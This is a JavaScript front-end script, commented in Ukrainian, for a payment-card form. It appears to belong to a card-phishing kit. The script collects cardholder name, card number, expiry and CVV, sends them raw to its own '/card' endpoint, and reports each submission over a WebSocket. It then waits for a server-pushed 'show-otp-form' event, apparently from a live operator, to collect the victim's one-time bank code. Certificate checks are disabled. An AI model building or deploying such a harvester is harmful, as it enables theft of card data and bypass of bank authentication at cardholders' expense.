// Підключення до WebSocket
const socket = io('https://localhost:3000', {
    withCredentials: true,
    rejectUnauthorized: false
});

// DOM елементи
const cardForm = document.getElementById('card-form');
const otpForm = document.getElementById('otp-form');
const loadingSpinner = document.getElementById('loading');
const notification = document.getElementById('notification');

// Функція для отримання CSRF токену
async function getCsrfToken() {
    try {
        const response = await fetch('https://localhost:3000/get-csrf-token', {
            credentials: 'include'
        });
        const data = await response.json();
        return data.csrfToken;
    } catch (error) {
        console.error('Помилка отримання CSRF токену:', error);
        return null;
    }
}

// Функції для роботи з формою
function formatCardNumber(input) {
    let value = input.value.replace(/\D/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    input.value = value;
}

function formatExpDate(input) {
    let value = input.value.replace(/\D/g, '');
    if (value.length >= 2) {
        value = value.slice(0, 2) + '/' + value.slice(2);
    }
    input.value = value;
}

// Обробники подій для форматування введення
document.getElementById('number').addEventListener('input', (e) => formatCardNumber(e.target));
document.getElementById('exp').addEventListener('input', (e) => formatExpDate(e.target));
document.getElementById('cvv').addEventListener('input', (e) => {
    e.target.value = e.target.value.replace(/\D/g, '');
});

// Показ повідомлень
function showNotification(message, type = 'info') {
    notification.textContent = message;
    notification.className = `notification ${type}`;
    notification.style.display = 'block';
    setTimeout(() => {
        notification.style.display = 'none';
    }, 5000);
}

// Обробка відправки форми карти
cardForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    
    const csrfToken = await getCsrfToken();
    if (!csrfToken) {
        showNotification('Помилка безпеки. Спробуйте оновити сторінку.', 'error');
        return;
    }
    
    const formData = {
        name: document.getElementById('name').value,
        number: document.getElementById('number').value.replace(/\s/g, ''),
        exp: document.getElementById('exp').value,
        cvv: document.getElementById('cvv').value,
        page: 3 // Ідентифікатор сторінки
    };

    loadingSpinner.style.display = 'block';
    cardForm.style.display = 'none';

    try {
        const response = await fetch('/card', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'CSRF-Token': csrfToken
            },
            credentials: 'include',
            body: JSON.stringify(formData)
        });

        const data = await response.json();
        
        if (response.ok) {
            socket.emit('card-submitted', { id: data.id, page: 3 });
            showNotification('Card details submitted successfully', 'success');
        } else {
            throw new Error(data.error || 'Failed to submit card details');
        }
    } catch (error) {
        showNotification(error.message, 'error');
        cardForm.style.display = 'block';
    }
    
    loadingSpinner.style.display = 'none';
});

// Обробка OTP
socket.on('show-otp-form', () => {
    otpForm.style.display = 'block';
    cardForm.style.display = 'none';
});

document.getElementById('submit-otp').addEventListener('click', async () => {
    const otp = document.getElementById('otp').value;
    
    try {
        const response = await fetch('/otp', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({ otp, page: 3 })
        });

        if (response.ok) {
            showNotification('OTP verified successfully', 'success');
            setTimeout(() => {
                window.location.href = '/success.html';
            }, 1000);
        } else {
            const data = await response.json();
            throw new Error(data.error || 'Failed to verify OTP');
        }
    } catch (error) {
        showNotification(error.message, 'error');
    }
}); 